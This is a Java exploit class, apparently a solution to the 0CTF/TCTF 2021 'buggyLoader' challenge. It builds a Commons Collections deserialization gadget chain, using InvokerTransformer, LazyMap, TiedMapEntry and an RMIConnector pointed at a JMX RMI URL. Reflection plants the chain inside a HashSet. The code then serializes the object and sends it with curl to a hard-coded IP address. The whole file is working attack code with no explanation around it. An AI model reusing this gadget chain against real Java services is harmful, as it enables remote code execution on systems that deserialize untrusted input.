package com.yxxx.buggyLoader;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Exp {
    public static void main(String[] args) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);

        Constructor con = InvokerTransformer.class.getDeclaredConstructor(String.class);
        con.setAccessible(true);
        
        InvokerTransformer transformer = (InvokerTransformer) con.newInstance("connect");

        JMXServiceURL jurl = new JMXServiceURL("service:jmx:rmi://c014:37777/stub/" + Temp.getExp());
        Map hashMapp = new HashMap();
        RMIConnector rc = new RMIConnector(jurl,hashMapp);

        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, transformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rc);


        HashSet hashSet = new HashSet(1);
        hashSet.add("c014");
        Field fmap = hashSet.getClass().getDeclaredField("map");
        fmap.setAccessible(true);
        HashMap innimpl = (HashMap) fmap.get(hashSet);
        Field ftable = hashMap.getClass().getDeclaredField("table");
        ftable.setAccessible(true);
        Object[] nodes =(Object[])ftable.get(innimpl);
        Object node = nodes[1];
        Field fnode = node.getClass().getDeclaredField("key");
        fnode.setAccessible(true);
        fnode.set(node, tiedMapEntry);


        oos.writeUTF("0CTF/TCTF");
        oos.writeInt(2021);
        oos.writeObject(hashSet);
        oos.close();

        byte[] exp = baos.toByteArray();
        String data = com.yxxx.buggyLoader.Utils.bytesTohexString(exp);
        String cc = "curl -v http://121.4.155.228/buggy -H c014:c014 -d data="+data;
        System.out.println(cc);
        java.io.InputStream in = Runtime.getRuntime().exec(cc).getInputStream();
        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        System.out.println(output);
    }
}
